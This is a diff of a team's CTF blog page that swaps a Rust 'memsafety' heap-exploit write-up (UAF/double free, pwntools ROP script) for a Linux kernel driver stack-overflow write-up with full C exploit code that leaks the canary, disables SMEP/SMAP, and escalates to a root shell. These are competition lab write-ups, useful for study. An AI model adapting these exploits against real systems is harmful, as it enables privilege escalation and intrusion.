@@ -20,7 +20,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="Hugo 0.37 with theme Tranquilpeak 0.4.3-BETA">
-    <title>N1CTF-2018 memsafety Writeup</title>
+    <title>N1CTF 2018 Network Card Writeup</title>
     <meta name="author" content="Team-Eur3kA">
     <meta name="keywords" content="N1CTF, N1CTF-2018, writeup">
 
@@ -28,15 +28,21 @@
     
 
     
-    <meta name="description" content="">
-    <meta property="og:description" content="">
+    <meta name="description" content="Hi, I&rsquo;m Ne0. Last weekend we Eur3kA played Nu1L CTF 2018 and won the champion. Thanks all my strong teammates. This kernel pwn challenge is not very difficult but kind of tricky. Thanks @Anciety&rsquo;s help.
+Challenge info The challenge files includes the following:
+➜ network_card ls bzImage initramfs.img nu1l.ko startvm.sh  Obviously we should focus on nu1l.ko. Take a look at the startvm.sh and we will find that we have to bypass kaslr,smep and smap to solve this challenge.">
+    <meta property="og:description" content="Hi, I&rsquo;m Ne0. Last weekend we Eur3kA played Nu1L CTF 2018 and won the champion. Thanks all my strong teammates. This kernel pwn challenge is not very difficult but kind of tricky. Thanks @Anciety&rsquo;s help.
+Challenge info The challenge files includes the following:
+➜ network_card ls bzImage initramfs.img nu1l.ko startvm.sh  Obviously we should focus on nu1l.ko. Take a look at the startvm.sh and we will find that we have to bypass kaslr,smep and smap to solve this challenge.">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="N1CTF-2018 memsafety Writeup">
-    <meta property="og:url" content="/2018/03/n1ctf-2018-memsafety-writeup/">
+    <meta property="og:title" content="N1CTF 2018 Network Card Writeup">
+    <meta property="og:url" content="/2018/03/n1ctf-2018-network-card-writeup/">
     <meta property="og:site_name" content="Team-Eur3kA Blog">
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Team-Eur3kA Blog">
-    <meta name="twitter:description" content="">
+    <meta name="twitter:description" content="Hi, I&rsquo;m Ne0. Last weekend we Eur3kA played Nu1L CTF 2018 and won the champion. Thanks all my strong teammates. This kernel pwn challenge is not very difficult but kind of tricky. Thanks @Anciety&rsquo;s help.
+Challenge info The challenge files includes the following:
+➜ network_card ls bzImage initramfs.img nu1l.ko startvm.sh  Obviously we should focus on nu1l.ko. Take a look at the startvm.sh and we will find that we have to bypass kaslr,smep and smap to solve this challenge.">
     
     
 
@@ -48,10 +54,6 @@
     
 
     
-      <meta property="og:image" content="https://www.vectorlogo.zone/logos/rust-lang/rust-lang-card.png">
-    
-    
-      <meta property="og:image" content="//d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city.jpg">
     
     
 
@@ -194,16 +196,18 @@
 </nav>
 
       
-  <div class="post-header-cover
-              text-center
-              "
-       style="background-image:url('//d1u9biwaxjngwg.cloudfront.net/welcome-to-tranquilpeak/city.jpg')"
-       data-behavior="4">
-    
-      <div class="post-header main-content-wrap text-center">
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      N1CTF-2018 memsafety Writeup
+      N1CTF 2018 Network Card Writeup
     </h1>
   
   
@@ -231,334 +235,378 @@
   </div>
 
 </div>
-    
-  </div>
-
-
-      <div id="main" data-behavior="4"
-        class="hasCover
-               hasCoverMetaIn
-               ">
-        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
-          
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p></p>
+              
 
-<h1 id="n1ctf-2018-memsafety-writeup">N1CTF 2018 memsafety writeup</h1>
+<p>Hi, I&rsquo;m <a href="https://github.com/Changochen">Ne0</a>. Last weekend we Eur3kA played Nu1L CTF 2018 and won the champion. Thanks all my strong teammates. This kernel pwn challenge is not very difficult but kind of tricky. Thanks <a href="https://github.com/Escapingbug">@Anciety&rsquo;s</a> help.</p>
 
-<h2 id="overview">Overview</h2>
+<h2 id="challenge-info">Challenge info</h2>
 
-<p>This is actually a quite interesting challenge for it uses my favorite <code>Rust</code>!</p>
+<p>The challenge files includes the following:</p>
 
-<p>After unzipping, there is a binary along with a <code>.rs</code> file and a libc.</p>
-
-<pre><code>distrib/
-├── libc.so.6
-├── main
-└── main.rs
+<pre><code class="language-bash">➜  network_card ls
+bzImage  initramfs.img  nu1l.ko  startvm.sh
 </code></pre>
 
-<p>Let&rsquo;s go through the <a href="https://github.com/Team-Eur3kA/n1ctf-2018/blob/master/source/pwn/memsafety/src/main.rs">source code it provided</a>. It is a &ldquo;calculator&rdquo; that is able to accept some commands.</p>
+<p>Obviously we should focus on <code>nu1l.ko</code>. Take a look at the <code>startvm.sh</code> and we will find that we have to bypass kaslr,smep and smap to solve this challenge.</p>
 
-<p>There is 3 kinds of commands, a number, a string or a vector. Vector is in a form like a python list.A global object is there to provide the ability to save the operated number, string or vector. Since we have the source, the logic is not hard to be clear.</p>
+<h2 id="the-driver">The driver</h2>
 
-<p>Where is the bug? I searched keyword &ldquo;unsafe&rdquo; on my instinct, since it is related to what is unsafe in <code>Rust</code> compiled binary, unfortunately, there is none. This confuses me when there is no such unsafe part, how can it be unsafe? I try to compile my own binary to instrument some <code>println!()</code> to print some information. That&rsquo;s when things are getting better.</p>
+<p>Load the driver into IDA, we find the logic is surprisingly simple. But to completely understand it, we need to repair the struct info. And this was done by Anciety.</p>
 
-<p>When I try to compile it using my <code>1.26 nightly rustc</code>, I get following result:</p>
+<p>This is a network driver. And all it provides is the function to forward packet from interface <code>null</code>&rsquo;s broadcast to localhost:1337. Details can be found in sub_0:</p>
 
-<pre><code>error[E0382]: use of moved value: `resvec`
-   --&gt; main.rs:942:45
-    |
-864 |                             } else if resvec.unwrap().len() &lt;= 100 {
-    |                                       ------ value moved here
-...
-942 |                                 let mut k = resvec.unwrap();
-    |                                             ^^^^^^ value used here after move
-    |
-    = note: move occurs because `resvec` has type `std::option::Option&lt;std::vec::Vec&lt;i32&gt;&gt;`, which does not implement the `Copy` trait
+<pre><code class="language-cpp">__int64 __usercall do_send@&lt;rax&gt;(int size@&lt;edi&gt;, struct Packet *data@&lt;rsi&gt;, unsigned __int16 input_size@&lt;r13w&gt;, int a4@&lt;r14d&gt;)
+{
+    /* some variable */
+    char buf[256]; 
+    u64 canary;
 
-error: aborting due to previous error
+    if ( !v4
+         || (v6 = data, data-&gt;header[1] != 'u')
+         || data-&gt;header[2] != '1'
+         || data-&gt;header[3] != 'L'
+         || (input_size = __ROL2__(data-&gt;size, 8), a4 = input_size, input_size != size - 0x30)
+         || (data = (struct Packet *)SOCK_DGRAM, (signed int)sock_create(2LL, SOCK_DGRAM, 17LL, &amp;sock) &lt; 0) )
+    {
+        result = 0LL;
+        goto LABEL_3;
+    }                   /* check header and size */
 
-If you want more information on this error, try using &quot;rustc --explain E0382&quot;
-</code></pre>
+    v18 = 2;
+    port = 0x3905;
+    ip = 0x100007F;
+    data = (struct Packet *)&amp;v18;
+    v7 = sock-&gt;ops-&gt;connect;
+    v8 = _x86_indirect_thunk_rax(sock, &amp;v18, 16LL, 0LL); /* connect */
 
-<p>One uses <code>Rust</code> a lot is surely familiar with this bug. Let&rsquo;s stop a little while to understand what the hell is the <code>moved value</code>.</p>
+    // some unimportant code
 
-<h2 id="rust-ownership-101">Rust Ownership 101</h2>
+    if ( input_size  )
+    {
+        index = 0LL;
+        do
+        {
+            c_char = input[index];
+            if ( size - 0x31 &gt; (signed int)index &amp;&amp; c_char == 0x13 &amp;&amp; input[index + 1] == 0x37  )
+                break;
+            buf[index++] = c_char ^ 0x6F;
 
-<p>Ownership is a very important feature in <code>Rust</code> language. It is the core to <code>Rust</code> memory safety property. So we now know why the challenge is called <code>memsafety</code>.</p>
+        }
+        while ( input_size &gt; (unsigned __int16)index  );
+    } // buffer overflow !!
 
-<p>In <code>Rust</code> language, a &ldquo;variable definition&rdquo; is not actually called that way, it is called &ldquo;binding&rdquo;. So when we &ldquo;define&rdquo; a variable, we are actually &ldquo;binding&rdquo; a name to that value.</p>
+    // some unimportant code
+    v9 = kernel_sendmsg(sock, (struct msghdr *)data, &amp;v15, 1uLL, v16);
+    // some unimportant code
 
-<pre><code class="language-Rust">let variable = 20; // This is a variable called &quot;variable&quot; binding to value 20
-let variable = 30; // This is not &quot;re-definition&quot; in other language. Just the very same name binds to another value 30
-</code></pre>
-
-<p>When we bind a name to a value, this name &ldquo;owns&rdquo; the value. By owning, I mean that it is the owner. What if the owner runs out of scope? Well, it drops!</p>
-
-<p>The &ldquo;assign&rdquo; in <code>Rust</code> is not like normal &ldquo;assign&rdquo;, it also consists of the ownership transition.</p>
-
-<pre><code class="language-Rust">let variable = 20; // &quot;variable&quot; now owns 20
-let owner_now = variable; // &quot;assign&quot;, which should be called &quot;move&quot;, the &quot;owner_now&quot; is the owner
-println!(&quot;{}&quot;, variable); // XXX This won't compile, since the variable is not the owner now, so we can't use the variable to refer to the value
-</code></pre>
-
-<p>If you are familiar with <code>C++</code>, this is much like the &ldquo;move&rdquo; in <code>C++ 11</code>(or 14?).
-What we really need to know, is that there is a lifetime of a binding. When the lifetime is out, it will be collected. That is one aspect how <code>Rust</code> achieves <code>zero-cost abstraction</code>.</p>
-
-<h2 id="back-to-our-problem">Back to our problem</h2>
-
-<p>According to the error message before, we know the problem is like we moved a value somewhere, while we are still using it. Think of something? Yup, UAF.</p>
-
-<p>Since a value is moved elsewhere, when that value goes out of scope, it will be collected, but that value is still usable, UAF is very obvious in this way. The &ldquo;<code>Copy</code> trait&rdquo; in the &ldquo;note&rdquo; part of the error message shows that it is no copiable, which means it will not be copied, this ensures the vulnerability.</p>
-
-<h2 id="jemalloc-problem">Jemalloc problem</h2>
-
-<p>By analyze a little bit, we are sure it uses the default <code>jemalloc</code> allocator. I don&rsquo;t know much about this allocator, but my leader @Atum tells me that I can&rsquo;t change the meta-data like we used to do with libc malloc. So how can we use this UAF problem? I wrote a PoC to know that how double free is handled, to our surprise, a mature allocator like this just allows it!</p>
-
-<pre><code class="language-Rust">#![feature(allocator_api)]
-#![feature(alloc)]
-extern crate alloc;
-
-use alloc::heap::*;
-
-fn main() {
-    let layout = Layout::from_size_align(0x100, 8).unwrap();
-    let new_layout = Layout::from_size_align(0x104, 8).unwrap();
-    let mut heap = Heap::default();
-    unsafe {
-        let a = heap.alloc(layout.clone()).unwrap();
-        println!(&quot;{:?}&quot;, a);
-        heap.dealloc(a, layout.clone());
-        heap.dealloc(a, layout.clone());
-        let a = heap.alloc(layout.clone()).unwrap();
-        println!(&quot;{:?}&quot;, a);
-        let a = heap.realloc(a, layout.clone(), new_layout).unwrap();
-        println!(&quot;{:?}&quot;, a);
-        let a = heap.alloc(layout.clone()).unwrap();
-        println!(&quot;{:?}&quot;, a);
-    }
 }
 </code></pre>
 
-<p>The output is:</p>
+<p>The buf is on the stack, and its length is fixed. But the size of our packet can be large than this, which causes kernel stack overflow.
+Besides,as the loop checks for 0x1337 as a sign to end, we can set the packet size to be some value like 0x400, and the content is 0x1337.Then we can make it leak 0x400 bytes in the stack without corrupting it. Finally,with the leaked cannary and kernel address, we can send a packet again, only this time we perform a kernel ROP.</p>
 
-<pre><code>0x7f3ed7815100
-0x7f3ed7815100
-0x7f3ed782b000
-0x7f3ed7815100
+<p>By the way, the port above is 0x3905, but when we listened on this port, we received nothing. After wasting some time debugging, we realized that the network endian stuff! So the port should be 0x539,which is 1337.</p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>With the infomation above, we plan to exploit the kernel with the following steps:
+1. Run a server that listens at localhost:1337
+2. Run a client that send a packet with large size but only with the content <code>\x13\x37</code>
+3. The server receives the leaked infomation. The client manages to read it.
+4. Perform kernel ROP.</p>
+
+<p>Kaslr can be easily defeated by leaking. And the SMEP and SMAP can be bypassed by writing CR4 register to be 0x6f0. This can be done by ROP easily.
+For more details, please take a look at:
+1. <a href="https://changochen.github.io/2018/02/07/sharif8/">Sharif CTF 2018&ndash;KDB writeup</a>,which is written in English
+2. <a href="https://www.anquanke.com/post/id/86490">一道简单内核题入门内核利用</a>,which is written in Chinese.</p>
+
+<p>The final exploit:</p>
+
+<p>Server.c:</p>
+
+<pre><code class="language-cpp">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;unistd.h&gt;
+#include&lt;errno.h&gt;
+#include&lt;sys/types.h&gt;
+#include&lt;sys/socket.h&gt;
+#include&lt;netinet/in.h&gt;
+#include&lt;string.h&gt;
+#include&lt;fcntl.h&gt;
+
+#define serverlen 0x10000
+
+#define ERR_EXIT(m) \
+    do { \
+        perror(m); \
+        exit(EXIT_FAILURE); \
+    } while (0)
+
+void echo_ser(int sock)
+{
+    char recvbuf[serverlen] = {0};
+    memset(recvbuf,0,serverlen);
+    struct sockaddr_in peeraddr;
+    socklen_t peerlen;
+    int n;
+
+    system(&quot;touch /tmp/res&quot;);
+    int fd=open(&quot;/tmp/res&quot;,O_RDWR);
+    while (1)
+    {
+
+        peerlen = sizeof(peeraddr);
+        memset(recvbuf, 0, sizeof(recvbuf));
+        n = recvfrom(sock, recvbuf, sizeof(recvbuf), 0,
+                     (struct sockaddr *)&amp;peeraddr, &amp;peerlen);
+        if (n &lt;= 0)
+        {
+
+            if (errno == EINTR)
+                continue;
+
+            ERR_EXIT(&quot;recvfrom error&quot;);
+        }
+        else if(n &gt; 0)
+        {
+            unsigned long* ptr=recvbuf+6;
+            int i;
+            printf(&quot;Received data：%s\n,length:%d\nFrom %s:%d\n&quot;,recvbuf,n,inet_ntoa(peeraddr.sin_addr),peeraddr.sin_port);
+            for(i=0;i&lt;(n-8)/8;i++){
+                if(i%4==0)
+                    printf(&quot;\n%d-%d:&quot;,i,i+3);
+                printf(&quot;%lx &quot;,ptr[i]);
+            }
+            write(fd,&amp;ptr[42],8);
+            write(fd,&amp;ptr[32],8);
+            close(fd);
+            return ;
+        }
+    }
+    close(sock);
+}
+
+int main(int argc,char** argv)
+{
+    setvbuf(stdout,0,2,0);
+    int sock;
+    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) &lt; 0)
+        ERR_EXIT(&quot;socket error&quot;);
+
+    int port=10000;
+    struct sockaddr_in servaddr;
+    memset(&amp;servaddr, 0, sizeof(servaddr));
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);
+
+
+    servaddr.sin_port = htons(1337);
+    if (bind(sock, (struct sockaddr *)&amp;servaddr, sizeof(servaddr)) &lt; 0){
+        ERR_EXIT(&quot;bind error&quot;);
+    }
+
+    echo_ser(sock);
+
+    return 0;
+}
+
 </code></pre>
 
-<p>Now we have a thought. We use double free to control some pointer then get a read or write any where.</p>
+<p>Client.c</p>
 
-<h2 id="global-helps">Global helps</h2>
+<pre><code class="language-cpp">#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;strings.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;fcntl.h&gt;
 
-<p>But where to control? Well, we need to find somewhere with a pointer on heap. The final decision is the global. The global has a vector of vector(<code>Vec&lt;Vec&lt;i32&gt;&gt;</code>), so it has to contain a pointer. The source of the vector can be found <a href="https://doc.rust-lang.org/1.20.0/src/alloc/vec.rs.html#11-2598">here</a>, since the type is <code>Vec&lt;Vec&lt;i32&gt;&gt;</code>, when we control the outer vector, the inner vector will be allocated on heap, and we can see the full struct there. So we are able to control the pointer and the length.</p>
+struct Packet{
+    char header[4];
+    unsigned short size;
+    char buffer[0x10000];
+};
 
-<p>Now, the problem is how can we make this to be allocated to where we double freed before, how long will this struct be? A vector structure is 24 bytes long, this can be ensured using runtime debugging methods. Since this global vector can only be extended using <code>.push()</code> method, we need to know how and when it is allocated. By digging a little bit in IDA, we can see that the allocation strategy is that when the space is not enough to hold a new appending object, it doubles it. The discovering of this is left for readers to accomplish.</p>
+typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
+typedef int __attribute__((regparm(3))) (*_msleep)(unsigned long second);
+typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
 
-<p>The first allocation of the vector is defined in the <code>new()</code> part of <code>Global</code>, it uses <code>with_capacity(10)</code> to allocate space for 10 possible elements. When it get doubled, the sizes can be 20 * 24, 40 * 24, 80 * 24 and so on.</p>
+char buf[0x30000];
 
-<h2 id="exploit-strategy">Exploit strategy</h2>
+_msleep msleep;
+_commit_creds commit_creds;
+_prepare_kernel_cred prepare_kernel_cred;
+unsigned long native_write_cr4;
+unsigned long poprdi;
+unsigned long user_cs, user_ss, user_rflags;
 
-<p>Final strategy to exploit:
-1. use double free bug to get 2 freed regions for later use
-2. push vector of different size to global vector, to make it double, then allocate the space where we freed before
-3. allocate a large vector of the same size as before, now this will be allocated at the same position of the global vector
-4. when we operates on the large vector in step 3, we are actually modifying global vector. Now we get read or write anywhere.
-5. use that to leak heap address, and leak some libc address on heap, then leak <code>environ</code> variable in libc to get stack address, finally write to stack to form a ROP chain.
-6. exit! ROP chain will then be triggered</p>
-
-<h2 id="final-exploit">Final exploit</h2>
-
-<pre><code class="language-Python">from pwn import *
-import os
-context(os='linux', arch='amd64', log_level='debug')
-
-DEBUG = False
-
-libc = ELF('./libc.so.6')
-
-if DEBUG:
-    p = process('./main', env={'LD_PRELOAD': os.getcwd() + '/libc.so.6'})
-else:
-    p = remote('47.98.57.30', 4279)
-    p.recvuntil('PoW:')
-    line = p.recvline()
-    output = subprocess.check_output(line, shell=True)
-    p.sendline(output)
-# libc at heap: 15220
-
-def read_to_vec(idx, idy, idz):
-    p.recvuntil('$')
-    p.sendline('9')
-    p.recvuntil('Index =&gt;')
-    p.sendline(str(idx))
-    p.recvuntil('Index =&gt;')
-    p.sendline(str(idy))
-    p.recvuntil('Index =&gt;')
-    p.sendline(str(idz))
-    
-def set_to_global(idx, num):
-    p.sendline('7')
-    p.recvuntil('Index =&gt;')
-    p.sendline(str(idx))
-    p.recvuntil('Value =&gt;')
-    p.sendline(str(num &amp; 0xffffffff))
-
-def dump_result(idx):
-    p.sendline('6')
-    p.recvuntil('number')
-    p.sendline(str(idx))
-    p.recvuntil('Result:')
-    result = int(p.recvline().strip('\n'))
-    return result
-
-def set_var(var):
-    p.recvuntil('$')
-    p.sendline('6')
-    p.sendline(str(var))
-
-def write_num_to_offset(offset, num):
-    set_var(num)
-    p.recvuntil('$')
-    p.sendline('5')
-    p.recvuntil('$')
-    p.sendline('9')
-    p.recvuntil('Index =&gt; ')
-    p.sendline(str(0))
-    p.recvuntil('Index =&gt; ')
-    p.sendline(str(offset))
+static void save_state()
+{
+    asm(
+        &quot;movq %%cs, %0\n&quot;
+        &quot;movq %%ss, %1\n&quot;
+        &quot;pushfq\n&quot;
+        &quot;popq %2\n&quot;
+        : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rflags)
+        :
+        : &quot;memory&quot;);
+}
 
 
-def dump_addr(addr):
-    set_to_global(0, addr &amp; 0xffffffff)
-    set_to_global(1, addr &gt;&gt; 32)
-    
-    read_to_vec(0, 0, 6)
-    read_to_vec(0, 1, 7)
+void get_shell()
+{
+    if(getuid()!=0){
+        puts(&quot;Get root failed!!!&quot;);
+        exit(0);
 
-    low = dump_result(6) &amp; 0xffffffff
-    high = dump_result(7) &amp; 0xffffffff
-    addr = low + (high &lt;&lt; 32)
-    return addr
+    }
+    printf(&quot;Enjoy your root shell:)\n&quot;);
+    system(&quot;/bin/sh&quot;);
+}
 
+static void shellcode()
+{
+    commit_creds(prepare_kernel_cred(0));
 
+    msleep(1000);
+    asm(
+        &quot;swapgs\n&quot;
+        &quot;movq %0,%%rax\n&quot;    // push things into stack for iretq
+        &quot;pushq %%rax\n&quot;
+        &quot;movq %1,%%rax\n&quot;
+        &quot;pushq %%rax\n&quot;
+        &quot;movq %2,%%rax\n&quot;
+        &quot;pushq %%rax\n&quot;
+        &quot;movq %3,%%rax\n&quot;
+        &quot;pushq %%rax\n&quot;
+        &quot;movq %4,%%rax\n&quot;
+        &quot;pushq %%rax\n&quot;
+        &quot;iretq\n&quot;
+        :
+        :&quot;r&quot;(user_ss),&quot;r&quot;(buf+0x20000),&quot;r&quot;(user_rflags),&quot;r&quot;(user_cs),&quot;r&quot;(get_shell)
+        :&quot;memory&quot;
+       );
+}
 
-def main():
-    if DEBUG:
-        raw_input()
-    p.recvuntil('&gt;&gt;&gt;')
-    p.sendline('[' + '1, ' * 119 + '1]')
-    p.recvuntil('$')
-    p.sendline('0')
-    p.recvuntil('(y/n): ')
-    p.sendline('n')
-    
-    p.recvuntil('&gt;&gt;&gt;')
-    p.sendline('[1, 1]')
-    for i in range(10):
-        log.info('allocating %d' % i)
-        p.recvuntil('$')
-        p.sendline('4')
-    p.sendline('0')
-    p.recvuntil('(y/n): ')
-    p.sendline('n')
+int main() {
+    system(&quot;./server &gt;/tmp/tt&amp;&quot;);
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
 
-    #p.recvuntil('&gt;&gt;&gt;')
-    #p.sendline('&quot;' + 'a' * 110 + '&quot;')
-    #p.sendline('0')
-    #p.recvuntil('(y/n): ')
-    #p.sendline('y')
+    struct Packet packet;
+    int bufferlen;
+    bufferlen=0x400;
 
-    p.recvuntil('&gt;&gt;&gt;')
-    p.sendline('[' + '1, ' * 119 + '1]')
-    p.recvuntil('$')
-    p.sendline('5')
+LOOP:
+    memcpy(packet.header,&quot;Nu1L&quot;,4);
+    memset(packet.buffer,0,bufferlen);
+    memcpy(packet.buffer,&quot;\x13\x37&quot;,2);
 
-    # get heap address
-    p.sendline('6')
-    p.recvuntil('number:')
-    p.sendline('0')
-    p.recvuntil('Result:')
-    heap_address_low = int(p.recvline().strip('\n'))
+    packet.size=bufferlen&gt;&gt;8;
 
-    p.sendline('6')
-    p.recvuntil('number:')
-    p.sendline('1')
-    p.recvuntil('Result:')
-    heap_address_high = int(p.recvline().strip('\n'))
-    heap_address = heap_address_low + (heap_address_high &lt;&lt; 32)
-    p.info('heap: ' + hex(heap_address))
-    if DEBUG:
-        heap_base = heap_address - 0x1f040
-    else:
-        heap_base = heap_address - 0x14040
-    p.info('heap base %x' % heap_base)
-    libc_at_heap = heap_base + 0x15220
+    struct sockaddr_in serv_addr;
 
-    #set_to_global(0, libc_at_heap)
+    int broadcast_enable = 1;
+    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &amp;broadcast_enable, sizeof(broadcast_enable)) &lt; 0) {
+        perror(&quot;setsockopt&quot;);
+        exit(-1);
+    }
 
-    libc_address = dump_addr(libc_at_heap)
-    libc_base = libc_address - 0x3c3260
-    
-    p.info('libc base %x' % libc_base)
+    bzero((char*) &amp;serv_addr, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(12345);
+    serv_addr.sin_addr.s_addr = inet_addr(&quot;6.6.6.255&quot;);
+    if (sendto(sock,&amp;packet, bufferlen+6, 0, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr)) &lt; 0) {
+        perror(&quot;sendto&quot;);
+    }
+    unsigned long canary,kernelbase;
+    int fd;
+    sleep(1);
+    fd=open(&quot;/tmp/res&quot;,O_RDWR);
+    if(fd==-1){
+        printf(&quot;Open failed!\n&quot;);
+        exit(0);
+    }
+    read(fd,&amp;kernelbase,8);
+    read(fd,&amp;canary,8);
+    close(fd);
 
-    environ_at_libc = libc.symbols['environ'] + libc_base
-    p.info('environ at libc %x' % environ_at_libc)
-    environ_addr = dump_addr(environ_at_libc)
-    
-    p.info('environ @ %x' % environ_addr)
+    if(canary==0)
+        goto LOOP;
 
-    ret_addr = environ_addr - 0x2b0
-    sh_addr = libc_base + list(libc.search('sh\x00'))[0]
-    pop_rdi = 0x0000000000021102 + libc_base
-    system_addr = libc_base + libc.symbols['system']
-    
-    p.info('writing ret_addr %x' % ret_addr)
-    set_to_global(0, ret_addr &amp; 0xffffffff)
-    set_to_global(1, ret_addr &gt;&gt; 32)
-    # size
-    set_to_global(2, 0x10)
-    set_to_global(4, 0x10)
-    
-    p.sendline('0')
-    p.recvuntil('(y/n):')
-    p.sendline('n')
+    unsigned long* ptr=packet.buffer+0x100;
+    prepare_kernel_cred=kernelbase-7649710;
+    commit_creds=prepare_kernel_cred-976;
+    unsigned long static_pre=0xffffffff8107d3a0;
+    native_write_cr4=prepare_kernel_cred-static_pre+0xffffffff8104d9ad;
+    poprdi=prepare_kernel_cred-static_pre+0xffffffff8124c735;
+    msleep=prepare_kernel_cred-0xffffffffab87d3a0+0xffffffffab8c7eb0;
 
-    p.sendline(str(0x13337))
+    printf(&quot;Canary :%lx\nKernelbase %lx\nCommit_creds:%lx\n&quot;,canary,kernelbase,commit_creds);
 
-    p.info('written pop rdi %x @ %x' % (pop_rdi, ret_addr))
-    write_num_to_offset(0, pop_rdi &amp; 0xffffffff)
-    write_num_to_offset(1, pop_rdi &gt;&gt; 32)
+    ptr[0]=canary^0x6F6F6F6F6F6F6F6F;
+    save_state();
+    printf(&quot;Eflags %lx,SS %lx, CS %lx\n&quot;,user_rflags,user_ss,user_cs);
+    unsigned long payload[]={
+        (unsigned long)buf+0x10000,
+        poprdi,
+        0x6f0,
+        (unsigned long)buf+0x10000,
+        native_write_cr4,
+        (unsigned long)buf+0x10000,
+        (unsigned long)shellcode,
+    };
+    for(int i=0;i&lt;sizeof(payload)/8;i++){
+        ptr[5+i]=payload[i]^0x6F6F6F6F6F6F6F6F;
+    }
 
-    p.info('written sh_addr %x @ %x' % (sh_addr, ret_addr + 0x8))
-    write_num_to_offset(2, sh_addr &amp; 0xffffffff)
-    write_num_to_offset(3, sh_addr &gt;&gt; 32)
-
-    p.info('written system_addr %x @ %x' % (system_addr, ret_addr + 0x10))
-    write_num_to_offset(4, system_addr &amp; 0xffffffff)
-    write_num_to_offset(5, system_addr &gt;&gt; 32)
-
-    p.sendline('0')
-    p.recvuntil('(y/n):')
-    p.sendline('n')
-    p.recvuntil('&gt;&gt;&gt;')
-    p.sendline('exit')
-
-    p.interactive()
-
-if __name__ == '__main__':
-    main()
+    memset(packet.buffer,0,0x100);
+    memcpy(packet.buffer+0x100+5*8+sizeof(payload),&quot;\x13\x37&quot;,2);
+    if (sendto(sock,&amp;packet, bufferlen+6, 0, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr)) &lt; 0) {
+        perror(&quot;sendto&quot;);
+    }
+    return 0;
+}
 </code></pre>
 
-<h2 id="conclusion">Conclusion</h2>
+<p>When I was solving this challenge, I found that the kernel crashed just after <code>iretq</code>. And the error infomation mentions something about scheduling. I don&rsquo;t know whether it is because the buffer overflow corrupts some data for scheduling. And the exploit is very unstable because of it. Then during debuggin I found that if the kernel performs scheduling before <code>iretq</code>, then the <code>iretq</code> is sure to succeed. I have no time to further debug it at the moment, but if any of you have any idea,please share it with <a href="changochen1@gmail.com">me</a>:)</p>
 
-<p><code>Rust</code> is a good language! Learn it and use it insted of <code>C++</code>, you will not regret. The community of <code>Rust</code> is quite active, even uses RFCs to carefully design this beautiful language.</p>
+<p>With all this,we have the following:</p>
 
-<p>The bug in this challenge is actually a compiler bug in <code>rustc 1.14</code>, it is astonishing how the writer of this challenge discovers and uses it. Will it be further bug in <code>Rust</code> compiler so it may lead to exploitation? We may never know.</p>
+<pre><code class="language-bash">__        __   _                            _        
+\ \      / /__| | ___ ___  _ __ ___   ___  | |_ ___  
+ \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \ 
+  \ V  V /  __/ | (_| (_) | | | | | |  __/ | || (_) |
+   \_/\_/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/ 
+                                                     
+ _   _ _  ____ _____ _____ 
+| \ | / |/ ___|_   _|  ___|
+|  \| | | |     | | | |_   
+| |\  | | |___  | | |  _|  
+|_| \_|_|\____| |_| |_|    
+
+/ $ id
+uid=1000(pwn) gid=1000 groups=1000
+/ $ ./client
+Canary :a5331ce835ea8f00
+Kernelbase ffffffff92dc8d4e
+Commit_creds:ffffffff9267cfd0
+Eflags 202,SS 2b, CS 33
+/ # id
+uid=0(root) gid=0
+/ # 
+</code></pre>
+
+<p>Enjoy your root shell:)</p>
+
               
             </div>
           </div>
@@ -587,7 +635,7 @@ if __name__ == '__main__':
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/03/n1ctf-2018-network-card-writeup/" data-tooltip="N1CTF 2018 Network Card Writeup">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -595,7 +643,7 @@ if __name__ == '__main__':
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/02/codegate-2018-7amebox1-writeup/" data-tooltip="CodeGate 2018 7amebox1 Writeup">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Team-Eur3kA.github.io/2018/03/n1ctf-2018-memsafety-writeup/" data-tooltip="N1CTF-2018 memsafety Writeup">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
@@ -645,7 +693,7 @@ if __name__ == '__main__':
           
             <li class="post-action">
               
